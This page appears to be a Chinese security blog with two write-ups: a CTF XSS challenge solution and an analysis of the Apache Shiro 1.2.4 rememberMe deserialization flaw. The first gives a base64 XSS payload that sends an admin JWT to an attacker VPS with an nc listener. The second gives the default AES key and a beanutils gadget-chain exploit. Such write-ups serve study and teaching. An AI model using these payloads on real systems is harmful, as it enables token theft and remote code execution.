<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">  <span class="keyword">let</span> flag = <span class="string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&quot;127.0.0.1&quot;</span> || req.<span class="property">ip</span> == <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="string">&quot;hgame&#123;true_flag_here&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; username, flag &#125;, secret)</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>其他路由都要求经过auth函数，明显需要在包头中添加<code>authorization: token </code> 否则跳转至根目录</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">headers</span>[<span class="string">&quot;authorization&quot;</span>]</span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, secret) || &#123;&#125;</span><br><span class="line">    req.<span class="property">user</span> = decoded</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;jwt decode error&quot;</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;user&#x2F;info 可以直接查看flag   </p>
<p>两步：1. 获取token 2.传token看flag</p>
<p>尝试了<code>x-forwarded-for</code>等很多伪造ip方式，都不行  这里的req.ip应该是不可伪造的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/user/info&quot;</span>, auth, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">username</span>: req.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">flag</span>: req.<span class="property">user</span>.<span class="property">flag</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>&#x2F;button&#x2F;share 中为关键逻辑</p>
<p>它会访问&#x2F;button&#x2F;preview  并且参数可控  那么也就相当于本地访问 正好满足我们的要求 <code>localStorage</code>中的<code>token</code>存放生成后的token</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>访问preview路由  明显存在XSS漏洞  但是过滤了alert  我们可以通过base64绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/button/preview?<span class="number">123</span><span class="string">&quot;&gt;&lt;script&gt;eval(atob(&#x27;YWxlcnQoMik%3D&#x27;))&lt;/script&gt;</span></span><br><span class="line"><span class="string">// alert(2)</span></span><br></pre></td></tr></table></figure>

<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol>
<li>通过share路由  构造好payload  服务器则会跳转至preview利用XSS执行我们的代码   </li>
<li>代码中先跳转至register获得服务器本地token然后外带至我们的vps</li>
<li>得到token后对应访问&#x2F;usr&#x2F;info即可获取flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /button/share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Authorization: [some_token_here]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;border-radius&quot;:&quot;0px\&quot;&gt;&lt;script&gt;eval(atob(&#x27;JC5wb3N0KCIvdXNlci9yZWdpc3RlciIseyJ1c2VybmFtZSI6ImFkbWluIn0sZnVuY3Rpb24ocmVzdWx0KXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzQ3Lnh4Lnh4Lnh4Ojk5OTk/Yz0nK0pTT04uc3RyaW5naWZ5KHJlc3VsdCl9KTs=&#x27;))&lt;/script&gt;&quot;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># $.post(&quot;/user/register&quot;,&#123;&quot;username&quot;:&quot;admin&quot;&#125;,function(result)&#123;document.location=&#x27;http://47.xx.xx.xx:9999?c=&#x27;+JSON.stringify(result)&#125;);</span></span><br><span class="line"><span class="comment"># vps上开启监听：nc -lvnp 9999; 注意收到的token要去掉双引号%22</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/12/20/HGAME2023-Designer-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/12/13/Shiro反序列化/" >Shiro反序列化</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-12-13
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接从github上clone代码到本地。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在IDEA（注意得是ultimate）中导入mvn项目, 并配置tomcat环境<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Shiro-550-1/1.png" alt="img"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据漏洞描述，Shiro≤1.2.4版本默认使用CookieRememberMeManager，当获取用户请求时，大致的关键处理过程如下：<br><strong>·</strong> 获取Cookie中rememberMe的值<br><strong>·</strong> 对rememberMe进行Base64解码<br><strong>·</strong> 使用AES进行解密<br><strong>·</strong> 对解密的值进行反序列化</p>
<p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当CookieRememberMeManager对恶意的rememberMe进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p>
<p><strong>以下流程可以的话一定自己动调  会更加清晰容易理解</strong></p>
<h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>先分析一下加密的过程。<br>在org&#x2F;apache&#x2F;shiro&#x2F;mgt&#x2F;DefaultSecurityManager.java代码的rememberMeSuccessfulLogin方法下断点。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png?raw=true" alt="img"></p>
<p>跟进onSuccessfulLogin方法，具体实现代码在AbstractRememberMeManager.java。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">        <span class="comment">//always clear any previous identity:</span></span><br><span class="line">        forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now save the new identity:</span></span><br><span class="line">        <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">            rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用forgetIdentity方法对subject进行处理，subject对象表示单个用户的状态和安全操作，包含认证、授权等（ <code>http://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/subject/Subject.html</code>）。继续跟进forgetIdentity方法，getCookie方法获取请求的cookie，接着会进入到removeFrom方法。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png?raw=true" alt="img"></p>
<p>removeForm主要在response头部添加Set-Cookie: rememberMe&#x3D;deleteMe<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png?raw=true" alt="img"></p>
<p>然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png?raw=true" alt="img"></p>
<p>rememberIdentity方法代码中，调用convertPrincipalsToBytes对用户名进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入convertPrincipalsToBytes，调用serialize对用户名进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进serialize方法来到org&#x2F;apache&#x2F;shiro&#x2F;io&#x2F;DefaultSerializer.java，很明显这里对用户名进行了序列化。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png?raw=true" alt="img"></p>
<p>再回到convertPrincipalsToBytes，接着对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png?raw=true" alt="img"></p>
<p>getEncryptionCipherKey获取加密的密钥，在AbstractRememberMeManager.java定义了默认的加密密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png?raw=true" alt="img"></p>
<p>加密完成后，继续回到rememberIdentity，跟进rememberSerializedIdentity方法。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png?raw=true" alt="img"></p>
<p>对加密的bytes进行base64编码，保存在cookie中。至此，加密的流程基本就分析完了。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png?raw=true" alt="img"></p>
<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>对cookie中rememberMe的解密代码也是在AbstractRememberMeManager.java中实现。直接在getRememberedPrincipals下断点。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png?raw=true" alt="img"></p>
<p>getRememberedSerializedIdentity返回cookie中rememberMe的base64解码后的bytes。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png?raw=true" alt="img"></p>
<p>继续调用convertBytesToPrincipals方法对解码后的bytes处理，跟进convertBytesToPrincipals方法，调用decrypt方法对bytes进行解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;</span><br><span class="line">        if (getCipherService() != null) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        return deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到的结果为序列化字符串的bytes。</p>
<p>然后进入到deserialize方法进行反序列化，即用户可控的rememberMe值经过解密后进行反序列化从而引发反序列化漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果想通过反序列化实现RCE  最好在shiro本身依赖当中寻找利用链  </p>
<p>这里利用到commons-beanutils  中的 <code>PropertyUtils.getProperty</code>  它可以对一个对象调用对应的get方法来获取成员变量的值  测试代码如下 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">18</span>, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(p, <span class="string">&quot;age&quot;</span>));	<span class="comment">// 18</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        Person(<span class="type">int</span> a, String n) &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = a;</span><br><span class="line">            <span class="built_in">this</span>.name = n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟进getProperty的逻辑发现它相当于就是拼接<code>get</code>和首字母大写后的成员变量 后得到函数名，搜索调用</p>
<h3 id="0z1"><a href="#0z1" class="headerlink" title="0z1"></a>0z1</h3><p>刚好TemplatesImpl 中有get方法并且会执行<strong>newTransformer()</strong> （作用可以看<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/12/13/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC3/">JAVA反序列化CC3</a>）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以构造类似<code>PropertyUtils.getProperty(templates, &quot;outputProperties&quot;)</code>来触发执行</p>
<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>接着追踪调用了getProperty的地方  有三处 但只有<code>BeanComparator</code>可以序列化  所以跟进</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">            <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数均可控</p>
<h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>BeanComparator 也是一种Comparator  用于比较类对象间大小   PriorityQueue在反序列化时如果有comparator会自动调用它的compare方法</p>
<p>构造（注意序列化的时候不能有数组类，否则反序列化时会报错  因此ChainedTransformer不再可用  具体可见 <a target="_blank" rel="noopener" href="https://changxia3.com/2020/10/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%88%E8%A7%A3%E7%96%91%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记三（解疑篇）</a>）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecode</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>][];</span><br><span class="line">        bytes[<span class="number">0</span>] = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\path\\to\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        bytecode.set(templates, bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;gg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformerFactoryImpl</span> <span class="variable">tfi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span 